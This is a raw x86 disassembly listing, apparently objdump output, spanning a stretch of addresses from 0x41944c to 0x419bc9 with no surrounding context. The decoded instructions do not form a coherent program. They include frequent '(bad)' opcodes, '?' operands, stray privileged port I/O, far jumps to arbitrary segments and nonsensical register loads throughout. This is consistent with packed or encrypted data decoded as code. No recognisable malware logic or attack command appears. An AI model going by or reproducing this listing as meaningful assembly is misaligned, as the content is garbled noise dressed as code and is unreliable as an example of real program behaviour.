  41944c:	adc    eax,DWORD PTR [edx-0x3a]
  41944f:	in     al,0xbb
  419451:	mov    ch,0x8c
  419453:	inc    edx
  419454:	pop    eax
  419455:	das    
  419456:	dec    ebp
  419457:	mov    ds:0x82b9ef6d,al
  41945c:	out    0x64,al
  41945e:	ins    BYTE PTR es:[edi],dx
  41945f:	arpl   sp,sp
  419461:	repnz lods eax,DWORD PTR ds:[esi]
  419463:	add    bh,ch
  419465:	sbb    al,0xca
  419467:	mov    WORD PTR [edi],es
  419469:	jno    0x4194b5
  41946b:	lods   eax,DWORD PTR ds:[esi]
  41946c:	jecxz  0x4194eb
  41946e:	(bad)  
  41946f:	xchg   ecx,eax
  419470:	(bad)
  419473:	mov    bh,0xc7
  419475:	in     al,0x90
  419477:	pushf  
  419478:	stos   DWORD PTR es:[edi],eax
  419479:	mov    esp,0x74ab9a62
  41947e:	push   esp
  41947f:	and    DWORD PTR [ecx-0x31],0x48f1be07
  419486:	lock push ebx
  419488:	jecxz  0x419446
  41948a:	xchg   BYTE PTR [esi-0x524b819b],bh
  419490:	or     DWORD PTR [ebp-0x3b022a34],ebp
  419496:	fbld   TBYTE PTR [eax+esi*4+0x2e]
  41949a:	xor    al,0x88
  41949c:	scas   al,BYTE PTR es:[edi]
  41949d:	dec    edi
  41949e:	sti    
  41949f:	push   esi
  4194a0:	fwait
  4194a1:	and    esp,DWORD PTR [edi]
  4194a3:	inc    esp
  4194a4:	jb     0x419464
  4194a6:	jo     0x4194c0
  4194a8:	or     esi,DWORD PTR [ebp+eax*2+0x568da34d]
  4194af:	ins    BYTE PTR es:[edi],dx
  4194b0:	xchg   edx,eax
  4194b1:	int3   
  4194b2:	(bad)  
  4194b3:	push   ds
  4194b4:	and    DWORD PTR [edi-0x30],esp
  4194b7:	ret    
  4194b8:	or     edx,edi
  4194ba:	push   es
  4194bb:	retf   
  4194bc:	mov    ebx,0x41fab16a
  4194c1:	add    DWORD PTR [ebx],esp
  4194c3:	cmc    
  4194c4:	in     al,dx
  4194c5:	rcr    BYTE PTR [eax+0x20],cl
  4194c8:	pop    eax
  4194c9:	cmp    eax,0xdaeca98e
  4194ce:	dec    ebx
  4194cf:	std    
  4194d0:	xchg   esp,eax
  4194d1:	sbb    cl,BYTE PTR [ebp-0x5d]
  4194d4:	(bad)  
  4194d5:	test   al,0x31
  4194d7:	ja     0x419500
  4194d9:	sbb    al,0xb2
  4194db:	xchg   ecx,eax
  4194dc:	data16 cmp ch,BYTE PTR [ebp-0x10263a7f]
  4194e3:	call   0xf8df:0xa4eab755
  4194ea:	and    cl,BYTE PTR [esp+edx*1]
  4194ed:	and    eax,0xe5360f17
  4194f2:	mov    cl,0x28
  4194f4:	div    eax
  4194f6:	and    eax,edi
  4194f8:	pop    edi
  4194f9:	mov    al,0xa6
  4194fb:	xor    al,0x1b
  4194fd:	inc    eax
  4194fe:	jl     0x4194ae
  419500:	inc    ebp
  419501:	stos   DWORD PTR es:[edi],eax
  419502:	push   esi
  419503:	imul   DWORD PTR [esi]
  419505:	mul    esp
  419507:	inc    esi
  419508:	leave  
  419509:	out    0xcc,eax
  41950b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41950c:	adc    dh,BYTE PTR [edx]
  41950e:	jo     0x419583
  419510:	jno    0x41953a
  419512:	or     eax,0x4973473f
  419517:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419518:	push   edi
  419519:	pop    es
  41951a:	ds xchg ebx,eax
  41951c:	adc    al,0xd7
  41951e:	or     eax,DWORD PTR [edi+0x49795158]
  419524:	and    al,0x1a
  419526:	jge    0x419548
  419528:	shl    eax,0x73
  41952b:	jg     0x419505
  41952d:	js     0x41956e
  41952f:	in     al,dx
  419530:	fild   WORD PTR [edi+0x7691c62]
  419536:	fldenv [ecx-0x6b1125e5]
  41953c:	mov    esi,0x89a20ce8
  419541:	lods   eax,DWORD PTR ds:[esi]
  419542:	shl    DWORD PTR [ebx-0x6043da2f],cl
  419548:	mov    ebx,0xe165bedf
  41954d:	xor    al,0x82
  41954f:	mov    cl,0x42
  419551:	sub    DWORD PTR [esi],ebp
  419553:	aas    
  419554:	xor    esi,DWORD PTR [edx+0x30]
  419557:	inc    ecx
  419558:	mov    bl,0x96
  41955a:	sahf   
  41955b:	inc    ebx
  41955c:	scas   al,BYTE PTR es:[edi]
  41955d:	js     0x41955b
  41955f:	mov    edi,0xca0a39d4
  419564:	pop    ds
  419565:	adc    al,0x5b
  419567:	sbb    esp,esi
  419569:	(bad)  
  41956a:	inc    DWORD PTR [edi+eax*2]
  41956d:	rol    DWORD PTR [edi+0x77f0c57d],1
  419573:	push   DWORD PTR [ecx]
  419575:	ret    
  419576:	into   
  419577:	adc    al,0x4d
  419579:	mov    dh,BYTE PTR [ebp+0x5b]
  41957c:	mov    cl,0x98
  41957e:	adc    eax,0xd890ebeb
  419583:	pop    ebx
  419584:	xchg   esi,eax
  419585:	push   cs
  419586:	idiv   BYTE PTR [esi+0x19]
  419589:	or     eax,0x6497187
  41958e:	pop    ss
  41958f:	dec    esi
  419590:	pop    ss
  419591:	push   ebp
  419592:	test   BYTE PTR [ebx+ebp*4-0x74],ah
  419596:	inc    edi
  419597:	imul   edx,ebx,0xb2c57742
  41959d:	jmp    0x419545
  41959f:	aas    
  4195a0:	or     cl,BYTE PTR [ebx]
  4195a2:	add    ebx,ebx
  4195a4:	lahf   
  4195a5:	jmp    0x41956a
  4195a7:	xchg   ecx,eax
  4195a8:	repz inc esp
  4195aa:	int3   
  4195ab:	jge    0x41953d
  4195ad:	mov    esi,0x56f1bc2a
  4195b2:	and    DWORD PTR es:[ecx],esi
  4195b5:	jl     0x4195c0
  4195b7:	call   0xe5bc71f6
  4195bc:	dec    ecx
  4195bd:	and    eax,0x199416ee
  4195c2:	jb     0x419596
  4195c4:	jne    0x41954c
  4195c6:	xchg   esi,eax
  4195c7:	int3   
  4195c8:	out    dx,eax
  4195c9:	inc    eax
  4195ca:	mov    BYTE PTR [ecx-0x24],bl
  4195cd:	and    ecx,DWORD PTR [ebp-0x19]
  4195d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195d1:	mov    al,ds:0x567c199
  4195d6:	pop    esi
  4195d7:	add    al,0xde
  4195d9:	jns    0x419636
  4195db:	rcr    DWORD PTR [ebx],0x4f
  4195de:	scas   al,BYTE PTR es:[edi]
  4195df:	or     eax,0x2e7b8f8e
  4195e4:	inc    ebp
  4195e5:	inc    ecx
  4195e6:	xchg   esp,eax
  4195e7:	aas    
  4195e8:	or     dl,BYTE PTR [ebx+0x34]
  4195eb:	sbb    DWORD PTR [ecx],0x32
  4195ee:	stos   DWORD PTR es:[edi],eax
  4195ef:	cs popf 
  4195f1:	out    dx,eax
  4195f2:	in     al,dx
  4195f3:	sahf   
  4195f4:	or     DWORD PTR [eax],esp
  4195f6:	push   DWORD PTR [esi]
  4195f8:	cmp    bh,bl
  4195fa:	mov    ?,WORD PTR [ebx]
  4195fc:	xor    al,0x24
  4195fe:	pop    ebp
  4195ff:	sub    eax,0xd7d25420
  419604:	add    edi,DWORD PTR [edi+0x1c]
  419607:	push   ds
  419608:	imul   BYTE PTR [esi+0x5e2d3a8a]
  41960e:	push   esi
  41960f:	pop    ss
  419610:	jne    0x4195bd
  419612:	enter  0x5888,0x12
  419616:	mov    ebx,0x3a5e31fa
  41961b:	mov    dh,0x45
  41961d:	add    DWORD PTR [edi],esi
  41961f:	iret   
  419620:	cmp    al,0x3d
  419622:	xchg   ebx,eax
  419623:	pop    esi
  419624:	and    eax,0xb511cd3d
  419629:	ret    
  41962a:	jne    0x4195c0
  41962c:	or     cl,bl
  41962e:	mov    dh,0xa9
  419630:	scas   al,BYTE PTR es:[edi]
  419631:	or     DWORD PTR [ebx-0x24ac9b00],esp
  419637:	push   cs
  419638:	mov    ch,0xf6
  41963a:	aam    0x4f
  41963c:	jmp    0x7105:0xc92fc5c3
  419643:	popa   
  419644:	cmp    esi,DWORD PTR [ebx]
  419646:	jnp    0x419604
  419648:	pusha  
  419649:	call   0xe9c52f82
  41964e:	or     cl,BYTE PTR ds:0x3d75a106
  419654:	sub    DWORD PTR [ecx+0x3996568e],esp
  41965a:	push   es
  41965b:	fdiv   QWORD PTR [ebx]
  41965d:	popf   
  41965e:	lods   eax,DWORD PTR ds:[esi]
  41965f:	retf   0x4280
  419662:	adc    al,0x28
  419664:	popa   
  419665:	or     al,0x5c
  419667:	xchg   esp,eax
  419668:	cdq    
  419669:	mov    ebp,0xa3ef93b5
  41966e:	clc    
  41966f:	ja     0x419613
  419671:	dec    eax
  419672:	adc    DWORD PTR [ecx-0x40539224],edx
  419678:	mov    ecx,0xc5c77815
  41967d:	and    eax,0xc0cf6df0
  419682:	dec    ecx
  419683:	add    DWORD PTR [eax],eax
  419685:	mov    esp,0x774b0a3b
  41968a:	imul   esp,esp,0xffffffbe
  41968d:	hlt    
  41968e:	jl     0x4196e1
  419690:	aas    
  419691:	js     0x419703
  419693:	daa    
  419694:	lds    ecx,FWORD PTR [edi-0x70caefaa]
  41969a:	adc    eax,0xb2a7f14e
  41969f:	xchg   DWORD PTR [edi+0x7f],ebx
  4196a2:	pusha  
  4196a3:	cdq    
  4196a4:	dec    ebx
  4196a5:	mov    ebx,0xbc84728c
  4196aa:	ret    
  4196ab:	ins    DWORD PTR es:[edi],dx
  4196ac:	daa    
  4196ad:	mov    cl,0x0
  4196af:	or     ch,bh
  4196b1:	test   BYTE PTR [esi+0x18b04707],ch
  4196b7:	push   0x6
  4196b9:	mov    ch,0xc7
  4196bb:	lods   eax,DWORD PTR ds:[esi]
  4196bc:	sbb    DWORD PTR [edi],edi
  4196be:	jl     0x4196cd
  4196c0:	jmp    0x6f52:0x2c321ab
  4196c7:	jge    0x4196a3
  4196c9:	mov    bl,0xe9
  4196cb:	out    dx,eax
  4196cc:	jae    0x4196a9
  4196ce:	mov    ch,0x38
  4196d0:	mov    dl,0xb7
  4196d2:	xchg   edx,eax
  4196d3:	dec    edi
  4196d4:	sub    BYTE PTR [ecx+eiz*2],dh
  4196d7:	sub    eax,0xa7071c38
  4196dc:	mov    DWORD PTR [esp+edi*4],ebx
  4196df:	aaa    
  4196e0:	not    BYTE PTR [edx+ebp*8]
  4196e3:	leave  
  4196e4:	push   0x4b9a074d
  4196e9:	inc    ebp
  4196ea:	test   BYTE PTR [ebp-0x529110e9],al
  4196f0:	mov    cl,0xa4
  4196f2:	adc    eax,0x409e8d06
  4196f7:	inc    ecx
  4196f8:	add    dh,BYTE PTR [edx+0x2a]
  4196fb:	xchg   edi,eax
  4196fc:	sub    al,BYTE PTR [ebx-0x666e08f1]
  419702:	dec    esi
  419703:	mov    WORD PTR [eax+0x36],cs
  419706:	push   ebx
  419707:	add    ebp,edx
  419709:	rol    BYTE PTR [edi],cl
  41970b:	add    esp,DWORD PTR ds:0x5691a3a2
  419711:	pop    esi
  419712:	xor    eax,0x1ce7fea3
  419717:	and    DWORD PTR [ebx+0x32ef995c],edi
  41971d:	and    bl,BYTE PTR [ebx+0x40]
  419720:	(bad)  
  419721:	push   ebx
  419722:	test   al,0xaa
  419724:	ror    DWORD PTR [ecx+0x48d37d67],0xcb
  41972b:	mov    ds:0xa7de3a5b,al
  419730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419731:	mov    ?,ecx
  419733:	adc    edx,ebp
  419735:	and    edi,DWORD PTR [ebx-0x301a576d]
  41973b:	push   ecx
  41973c:	retf   
  41973d:	bound  esp,QWORD PTR [edi+0x7e72d938]
  419743:	push   edx
  419744:	xchg   edi,eax
  419745:	jmp    0xd521:0xf2673df7
  41974c:	in     al,dx
  41974d:	in     al,0x36
  41974f:	or     eax,0xe5bee40c
  419754:	xor    ecx,DWORD PTR [eax]
  419756:	push   ss
  419757:	sbb    BYTE PTR [ebp-0x63],bh
  41975a:	mov    al,0x96
  41975c:	push   0xba74d4ae
  419761:	outs   dx,DWORD PTR ds:[esi]
  419762:	retf   
  419763:	pop    ds
  419764:	xchg   bl,dl
  419766:	cdq    
  419767:	cmc    
  419768:	mov    edi,ebp
  41976a:	and    esi,edx
  41976c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41976d:	and    bh,ch
  41976f:	mov    bh,0xee
  419771:	xchg   ebp,eax
  419772:	xor    DWORD PTR [ecx+0x56],ebx
  419775:	mov    BYTE PTR ds:0xbdaea49e,bl
  41977b:	inc    ebx
  41977c:	cmp    BYTE PTR [ecx+esi*1],bh
  41977f:	js     0x4197b3
  419781:	and    dl,dh
  419783:	push   esi
  419784:	je     0x4197c9
  419786:	jp     0x4197c8
  419788:	aas    
  419789:	mov    ds:0xb6e78c7b,al
  41978e:	ins    BYTE PTR es:[edi],dx
  41978f:	into   
  419790:	inc    esp
  419791:	xchg   BYTE PTR [esi],bl
  419793:	outs   dx,BYTE PTR ds:[esi]
  419794:	call   0x40d9:0xaf1b728
  41979b:	(bad)  
  41979c:	pop    edx
  41979d:	nop
  41979e:	enter  0x3d7f,0x30
  4197a2:	mov    ecx,0xecb65123
  4197a7:	mov    ebx,0x1ebbab06
  4197ac:	ss popa 
  4197ae:	jns    0x4197db
  4197b0:	jmp    0xcb17:0xe0a50855
  4197b7:	jmp    0x4197cb
  4197b9:	lods   eax,DWORD PTR ds:[esi]
  4197ba:	fisubr WORD PTR [ebx+ebp*8]
  4197bd:	mov    al,0x11
  4197bf:	fwait
  4197c0:	adc    BYTE PTR [edx],bh
  4197c2:	mov    dh,0x23
  4197c4:	inc    ecx
  4197c5:	fisttp WORD PTR [edx+0x5]
  4197c8:	outs   dx,DWORD PTR ds:[esi]
  4197c9:	or     DWORD PTR [ebp+0x39],0xfffffff3
  4197cd:	cmp    BYTE PTR [esi],0x3a
  4197d0:	jmp    0x41982d
  4197d2:	je     0x419840
  4197d4:	inc    edi
  4197d5:	lods   al,BYTE PTR ds:[si]
  4197d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197d8:	jle    0x419790
  4197da:	sbb    cl,ch
  4197dc:	popa   
  4197dd:	push   esp
  4197de:	sti    
  4197df:	retf   0xe7a2
  4197e2:	ja     0x4197ea
  4197e4:	in     eax,0x65
  4197e6:	cdq    
  4197e7:	push   ds
  4197e8:	sub    BYTE PTR [ebx],ah
  4197ea:	sub    cl,BYTE PTR [ecx+0x3f]
  4197ed:	push   0x40814703
  4197f2:	xchg   ebx,edi
  4197f4:	dec    esp
  4197f5:	mov    esi,0xec647975
  4197fa:	mov    ecx,0xc706e40
  4197ff:	pop    esp
  419800:	shl    DWORD PTR [ecx],1
  419802:	adc    eax,0x27f8b2ef
  419807:	mov    eax,0x81205967
  41980c:	xor    bl,0x82
  41980f:	sbb    al,dl
  419811:	lahf   
  419812:	dec    esp
  419813:	ss push ss
  419815:	add    bh,BYTE PTR [edx]
  419817:	ss pop ds
  419819:	inc    ebx
  41981a:	pop    ecx
  41981b:	cmp    ah,BYTE PTR [edx]
  41981d:	add    DWORD PTR [esi],0x37
  419820:	mov    eax,0xfecc8bc9
  419825:	inc    eax
  419826:	xlat   BYTE PTR ds:[ebx]
  419827:	xor    al,0xa3
  419829:	mov    WORD PTR [ecx-0x32],cs
  41982c:	sub    al,0x95
  41982e:	jmp    0x1818:0xef98c713
  419835:	fiadd  DWORD PTR [ebx-0xe]
  419838:	ficomp WORD PTR [esi+ebx*1+0x6eb65c62]
  41983f:	jbe    0x419808
  419841:	xchg   esi,eax
  419842:	mov    esp,0xc6403f4d
  419847:	mov    cs,WORD PTR es:[ebx+ebx*4-0x7404afd1]
  41984f:	sub    dl,bh
  419851:	gs xor bh,ah
  419854:	mov    al,0x45
  419856:	cmc    
  419857:	call   0x29e99e13
  41985c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41985d:	jae    0x41981f
  41985f:	bound  eax,QWORD PTR [edx]
  419861:	int3   
  419862:	aad    0x4d
  419864:	add    eax,0x37932975
  419869:	sti    
  41986a:	sbb    DWORD PTR [ebp-0x62d6edc4],esp
  419870:	jmp    0x2b8b:0x869c1d4b
  419877:	inc    edi
  419878:	pushf  
  419879:	sub    cl,ch
  41987b:	jno    0x4198d0
  41987d:	mov    al,0x2d
  41987f:	mov    ecx,0xc91097ca
  419884:	push   0x73
  419886:	xor    ecx,DWORD PTR [edx]
  419888:	stos   DWORD PTR es:[edi],eax
  419889:	call   0xfa2bbda7
  41988e:	cmp    edi,esi
  419890:	mov    ds:0x13ce4ff0,al
  419895:	lods   eax,DWORD PTR ds:[esi]
  419896:	aam    0xda
  419898:	je     0x4198fa
  41989a:	iret   
  41989b:	mov    eax,0x57992a52
  4198a0:	retf   
  4198a1:	lahf   
  4198a2:	mov    ebp,0x528f1f37
  4198a7:	scas   eax,DWORD PTR es:[edi]
  4198a8:	adc    al,0x5
  4198aa:	pusha  
  4198ab:	pushf  
  4198ac:	cli    
  4198ad:	sti    
  4198ae:	xor    esp,ecx
  4198b0:	mov    bl,0x82
  4198b2:	mov    ds:0x49b9dbab,al
  4198b7:	and    eax,0x3f1509d8
  4198bc:	ins    BYTE PTR es:[edi],dx
  4198bd:	mov    edi,0x3b90d51c
  4198c2:	add    DWORD PTR [edi],ecx
  4198c4:	jbe    0x41992a
  4198c6:	and    esp,ecx
  4198c8:	das    
  4198c9:	mov    ?,eax
  4198cb:	jo     0x419894
  4198cd:	sub    al,0xe8
  4198cf:	lahf   
  4198d0:	repnz in eax,0xa7
  4198d3:	fisttp WORD PTR [ecx]
  4198d5:	test   edx,ecx
  4198d7:	add    eax,ebx
  4198d9:	pop    ebx
  4198da:	scas   eax,DWORD PTR es:[edi]
  4198db:	cmp    BYTE PTR [ebx],dh
  4198dd:	jle    0x4198b4
  4198df:	adc    al,dl
  4198e1:	push   eax
  4198e2:	mov    BYTE PTR [ebx-0x41],ch
  4198e5:	xchg   esi,eax
  4198e6:	pop    edx
  4198e7:	fnstenv [ebx-0x79]
  4198ea:	pop    es
  4198eb:	fbld   TBYTE PTR [edi+0x58]
  4198ee:	lods   al,BYTE PTR ds:[esi]
  4198ef:	and    DWORD PTR [ecx-0x24f13774],0x6751218c
  4198f9:	xchg   DWORD PTR [esi+ecx*8-0x26],ebx
  4198fd:	ss mov ebx,0x800ddc33
  419903:	cli    
  419904:	ret    
  419905:	hlt    
  419906:	mov    ebx,0xb7c5697a
  41990b:	out    dx,al
  41990c:	inc    edx
  41990d:	push   ss
  41990e:	nop
  41990f:	pushf  
  419910:	or     dh,bh
  419912:	cmp    eax,0xf20426dc
  419917:	clc    
  419918:	sub    DWORD PTR [ecx-0x45],0xffffffbe
  41991c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41991d:	aad    0x3a
  41991f:	adc    ah,ch
  419921:	js     0x4198ce
  419923:	and    esi,DWORD PTR [ebp-0x4a]
  419926:	xor    DWORD PTR [ecx+0x56],esi
  419929:	aas    
  41992a:	push   0xffffffb8
  41992c:	pop    es
  41992d:	and    BYTE PTR [ebx+eax*1+0x7b],dl
  419931:	aam    0x77
  419933:	gs dec esp
  419935:	xor    ebp,DWORD PTR [edi+0x17]
  419938:	xor    eax,0xd9eb46be
  41993d:	jo     0x419922
  41993f:	dec    esp
  419940:	je     0x4198d0
  419942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419943:	add    dh,dl
  419945:	or     ebx,ebx
  419947:	dec    edx
  419948:	arpl   WORD PTR [ebp+0x13b9698f],dx
  41994e:	scas   al,BYTE PTR es:[edi]
  41994f:	loope  0x419974
  419951:	or     BYTE PTR [eax-0x1b],0xdc
  419955:	dec    esp
  419956:	xchg   edx,eax
  419957:	dec    ecx
  419958:	mov    ebp,0x509c4ac2
  41995d:	jb     0x419985
  41995f:	jmp    0x9a38:0xe50bcfa5
  419966:	aad    0x1b
  419968:	jbe    0x419962
  41996a:	into   
  41996b:	mov    esp,0x4f56d183
  419970:	loop   0x419964
  419972:	into   
  419973:	push   ecx
  419974:	mov    ah,0x7a
  419976:	imul   esi,DWORD PTR [ebx-0xd],0x284bed59
  41997d:	fiadd  DWORD PTR [esi+0x591d2fa8]
  419983:	mov    ah,0x82
  419985:	sbb    edx,DWORD PTR [ebx+ebx*2]
  419988:	jecxz  0x419956
  41998a:	fisttp QWORD PTR [esi+ebp*1+0x29]
  41998e:	ja     0x419968
  419990:	mov    eax,ds:0xcf0091f5
  419995:	mov    ch,0x94
  419997:	test   DWORD PTR [esi],eax
  419999:	xor    al,0xc9
  41999b:	cli    
  41999c:	ins    BYTE PTR es:[edi],dx
  41999d:	jmp    0x419931
  41999f:	mov    dl,0xab
  4199a1:	push   esp
  4199a2:	mov    DWORD PTR [bp+di+0x71],ebx
  4199a6:	por    mm2,QWORD PTR [edi-0x6cd1645f]
  4199ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199ae:	arpl   di,sp
  4199b0:	inc    esp
  4199b1:	lock mov ?,WORD PTR [esi]
  4199b4:	fisttp QWORD PTR [ecx]
  4199b6:	cmp    bh,dh
  4199b8:	push   ds
  4199b9:	jns    0x4199df
  4199bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199bc:	pop    edx
  4199bd:	cli    
  4199be:	and    DWORD PTR [esi+0x7f],ebp
  4199c1:	mov    ah,0xcb
  4199c3:	push   edx
  4199c4:	adc    al,0x3c
  4199c6:	shl    BYTE PTR [edx],0x50
  4199c9:	aad    0x8
  4199cb:	nop
  4199cc:	in     al,0xc8
  4199ce:	div    DWORD PTR [edx+ecx*4+0x1a]
  4199d2:	and    al,0x5f
  4199d4:	ins    DWORD PTR es:[edi],dx
  4199d5:	mov    esi,0x86717a57
  4199da:	jb     0x419a04
  4199dc:	xchg   BYTE PTR [esi],al
  4199de:	xor    dh,BYTE PTR ds:[edx]
  4199e1:	xchg   DWORD PTR ds:0xefa2a0e7,ecx
  4199e7:	es pusha 
  4199e9:	in     eax,0xe2
  4199eb:	pushf  
  4199ec:	je     0x419972
  4199ee:	inc    esp
  4199ef:	scas   eax,DWORD PTR es:[edi]
  4199f0:	lea    eax,[eax+eiz*4]
  4199f3:	je     0x4199a9
  4199f5:	scas   eax,DWORD PTR es:[edi]
  4199f6:	call   0xeb70e9a5
  4199fb:	imul   esp,edx,0xd181352f
  419a01:	std    
  419a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a03:	mov    BYTE PTR [ebp+ebx*2+0x564fe8e4],dh
  419a0a:	pop    ebp
  419a0b:	xchg   edi,eax
  419a0c:	and    al,0x38
  419a0e:	mov    cl,0x86
  419a10:	ja     0x4199c4
  419a12:	fcomi  st,st(0)
  419a14:	mov    eax,ds:0x3bc833ee
  419a19:	mov    ch,0x46
  419a1b:	push   ebx
  419a1c:	push   es
  419a1d:	add    dh,dl
  419a1f:	aad    0xe
  419a21:	cld    
  419a22:	cwde   
  419a23:	ror    BYTE PTR [ecx-0x48],0x9
  419a27:	sar    BYTE PTR [edx-0x1b],1
  419a2a:	pop    edi
  419a2b:	mov    DWORD PTR [eax-0x58],edx
  419a2e:	mov    ebx,0xfe02713f
  419a33:	adc    ch,BYTE PTR [edi]
  419a35:	jb     0x4199db
  419a37:	pop    ebx
  419a38:	pop    edx
  419a39:	pusha  
  419a3a:	mov    esp,0x66ddc1f3
  419a3f:	xchg   ecx,eax
  419a40:	in     eax,0x11
  419a42:	cmp    eax,0xecb46c7a
  419a47:	and    ebp,eax
  419a49:	les    edx,FWORD PTR [edi]
  419a4b:	inc    esp
  419a4c:	and    ax,WORD PTR [ecx+eax*8+0x37]
  419a51:	jmp    0x892bde4b
  419a56:	imul   ebp,DWORD PTR [ebx],0xffffffae
  419a59:	pop    edi
  419a5a:	fiadd  WORD PTR [esi+0x728f55fa]
  419a60:	adc    eax,DWORD PTR [edx+0x301267d]
  419a66:	lahf   
  419a67:	pop    esi
  419a68:	or     eax,DWORD PTR [eax+0x6c9cf8f0]
  419a6e:	neg    DWORD PTR [esi+eax*1+0x69a0d7c9]
  419a75:	sahf   
  419a76:	dec    edx
  419a77:	out    dx,al
  419a78:	imul   eax,esp,0x48
  419a7b:	xchg   esi,eax
  419a7c:	and    eax,0x2b73d033
  419a81:	cs xchg ebp,eax
  419a83:	lods   al,BYTE PTR ds:[esi]
  419a84:	and    ah,BYTE PTR [esi]
  419a86:	inc    ebx
  419a87:	mov    DWORD PTR [eax-0x68],ebx
  419a8a:	or     ch,BYTE PTR [edx+0x7e]
  419a8d:	sbb    BYTE PTR [eax+0x59],dl
  419a90:	inc    eax
  419a91:	dec    ecx
  419a92:	pop    ebx
  419a93:	xor    al,0x73
  419a95:	inc    eax
  419a96:	mov    esp,0xbf7b27bd
  419a9b:	mov    ch,0x3d
  419a9d:	add    BYTE PTR [esi],ch
  419a9f:	stos   BYTE PTR es:[edi],al
  419aa0:	test   DWORD PTR [edi+0x6d16c6f7],ebx
  419aa6:	ds icebp 
  419aa8:	or     al,0x12
  419aaa:	pop    esp
  419aab:	aas    
  419aac:	icebp  
  419aad:	in     al,dx
  419aae:	jmp    0xf4e4:0xc973a601
  419ab5:	popf   
  419ab6:	ret    
  419ab7:	mov    dh,0x59
  419ab9:	gs mov ch,al
  419abc:	pop    edx
  419abd:	or     dh,BYTE PTR [edx+esi*1]
  419ac0:	pop    edx
  419ac1:	inc    edi
  419ac2:	jge    0x419b0b
  419ac4:	or     eax,0x133f4769
  419ac9:	cmp    al,0xa6
  419acb:	dec    eax
  419acc:	inc    esi
  419acd:	shl    DWORD PTR [eax+0x74],1
  419ad0:	fxch   st(4)
  419ad2:	jl     0x419b33
  419ad4:	mov    ecx,0xe053e799
  419ad9:	daa    
  419ada:	xor    bh,BYTE PTR [eax+0x60ef9803]
  419ae0:	jbe    0x419af8
  419ae2:	das    
  419ae3:	in     eax,dx
  419ae4:	daa    
  419ae5:	pop    ss
  419ae6:	pusha  
  419ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ae8:	cmp    bl,BYTE PTR [esi]
  419aea:	jno    0x419b52
  419aec:	lods   al,BYTE PTR ds:[esi]
  419aed:	rol    DWORD PTR [ebp-0x7f],1
  419af0:	scas   al,BYTE PTR es:[edi]
  419af1:	mov    ebp,0x612f30d7
  419af6:	xor    esi,DWORD PTR fs:[ecx+0x6e]
  419afa:	and    DWORD PTR [ebx+0x1b1223b6],esi
  419b00:	out    dx,eax
  419b01:	and    al,0xc8
  419b03:	retf   
  419b04:	fst    DWORD PTR [edi]
  419b06:	push   0xffffffca
  419b08:	enter  0xcda2,0xfb
  419b0c:	test   bh,0x55
  419b0f:	addr16 mov ah,0x28
  419b12:	jmp    0x2c465f58
  419b17:	scas   al,BYTE PTR es:[edi]
  419b18:	cmp    esi,ebx
  419b1a:	aam    0x31
  419b1c:	inc    eax
  419b1d:	xchg   ecx,eax
  419b1e:	ins    BYTE PTR es:[edi],dx
  419b1f:	jo     0x419ae9
  419b21:	arpl   WORD PTR [ebx-0x29],sp
  419b24:	(bad)  
  419b25:	popf   
  419b26:	mov    al,0x3f
  419b28:	xor    BYTE PTR [eax],0xbd
  419b2b:	repnz sahf 
  419b2d:	fist   WORD PTR [ebx]
  419b2f:	jmp    0x419aea
  419b31:	fcomip st,st(3)
  419b33:	xchg   esi,eax
  419b34:	mov    ch,0x7d
  419b36:	pop    edi
  419b37:	add    BYTE PTR [ecx-0x2dea63ae],ch
  419b3d:	lahf   
  419b3e:	and    DWORD PTR [edx+0x40],ecx
  419b41:	xor    al,0xb4
  419b43:	js     0x419b6e
  419b45:	fcom   QWORD PTR [edx]
  419b47:	js     0x419b1c
  419b49:	pop    ds
  419b4a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  419b4c:	outs   dx,BYTE PTR ds:[esi]
  419b4d:	shr    BYTE PTR es:[edx-0x30d80fa],0xa2
  419b55:	or     eax,0x13e07bfd
  419b5a:	and    eax,0x1215762c
  419b5f:	fwait
  419b60:	pop    esp
  419b61:	fs iret 
  419b63:	clc    
  419b64:	es dec eax
  419b66:	mov    eax,0x2216ee64
  419b6b:	push   edx
  419b6c:	not    BYTE PTR es:[ebp+0x2b]
  419b70:	push   edi
  419b71:	adc    DWORD PTR [ecx+edi*4+0x33],ebp
  419b75:	push   ss
  419b76:	push   ds
  419b77:	rol    BYTE PTR [esi+0x568d0b0b],1
  419b7d:	inc    esp
  419b7e:	xchg   esp,eax
  419b7f:	stos   DWORD PTR es:[edi],eax
  419b80:	jno    0x419b91
  419b82:	imul   edx,DWORD PTR [ecx],0x52
  419b85:	xor    ecx,DWORD PTR [edx+0x13]
  419b88:	or     al,0x46
  419b8a:	mov    BYTE PTR [ecx],ah
  419b8c:	aas    
  419b8d:	sti    
  419b8e:	das    
  419b8f:	pop    esp
  419b90:	mov    ecx,DWORD PTR [edx]
  419b92:	bswap  ebp
  419b94:	jecxz  0x419b46
  419b96:	rcl    DWORD PTR [eax+0x97c3c38],1
  419b9c:	pop    ebp
  419b9d:	cli    
  419b9e:	sub    eax,0x5d620313
  419ba3:	dec    esp
  419ba4:	adc    al,0xd1
  419ba6:	out    0xf4,eax
  419ba8:	push   es
  419ba9:	fdiv   DWORD PTR [edi-0x64]
  419bac:	push   eax
  419bad:	shl    DWORD PTR [esi-0x7f],1
  419bb0:	inc    ecx
  419bb1:	scas   eax,DWORD PTR es:[edi]
  419bb2:	mov    bh,0x55
  419bb4:	mov    ebx,0x44927123
  419bb9:	(bad)  
  419bba:	loop   0x419be3
  419bbc:	sub    al,0xdd
  419bbe:	push   edi
  419bbf:	fdivr  DWORD PTR ds:[edx-0x6f]
  419bc3:	loope  0x419c3b
  419bc5:	xchg   DWORD PTR [esp+esi*2-0x1c],ecx
  419bc9:	pusha  
